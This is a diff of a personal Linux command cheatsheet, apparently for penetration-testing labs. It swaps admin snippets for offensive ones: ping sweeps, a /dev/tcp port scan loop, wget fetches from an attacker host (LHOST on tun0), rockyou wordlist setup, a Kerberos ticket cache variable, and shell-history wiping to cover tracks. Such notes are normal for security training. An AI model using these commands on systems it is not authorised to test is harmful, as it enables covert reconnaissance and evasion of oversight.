@@ -1,27 +1,39 @@
 % linux
 
-# wifi drivers
-lspci | grep "Network controller”
-apt-get update
-apt-get install linux-image-$(uname -r|sed 's,[^-]*-[^-]*-,,') linux-headers-$(uname -r|sed 's,[^-]*-[^-]*-,,') broadcom-sta-dkms
-modprobe -r b44 b43 b43legacy ssb brcmsmac bcma
-modprobe wl
-
-# connecting to wifi
-nmcli device wifi list
-nmcli device wifi connect <SSID> password <PASS>
-
-# apt purge proper
-sudo apt-get purge --auto-remove <PKG_NAME>
-
-# kill process by name
-pkill -f <NAME>
-
-# ping sweep
+# ping sweep host scan /24
 for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
+for i in {1..255}; do (ping -c 1 <SUBNET_IP>.${i} | grep "bytes from" &); done
 
-# chown user and group (recursively)
-chown newuser:newgroup example.txt
-chown -R newuser:newgroup /path/to/directory
+# port scan
+for i in {1..65535}; do (echo > /dev/tcp/<IP>/$i) >/dev/null 2>&1 && echo $i is open; done
+
+# compile for windows cpp
+x86_64-w64-mingw32-g++ your_file.cpp -o output_name.exe
+
+# latest apache access logs
+tail -f /var/log/apache2/access.log
+
+# clear history
+history -c && history -w
+rm ~/.zsh_history
+
+# download wget
+wget http://<LHOST>/<DIR>
+
+# download wget rename
+wget http://<LHOST>/<DIR> -O <NEWFILE>
+
+# rockyou.txt
+sudo tar xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /usr/share/seclists/Passwords/Leaked-Databases/
+
+# linux kerberos
+export KRB5CCNAME=/tmp/krb5cc_minenow
+
+# recursively find string in files
+grep -Horni <TEXT> <DIR> 
+grep -Hrni <TEXT> <DIR> 
+
+# test reverse ping
+sudo tcpdump -i tun0 icmp
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
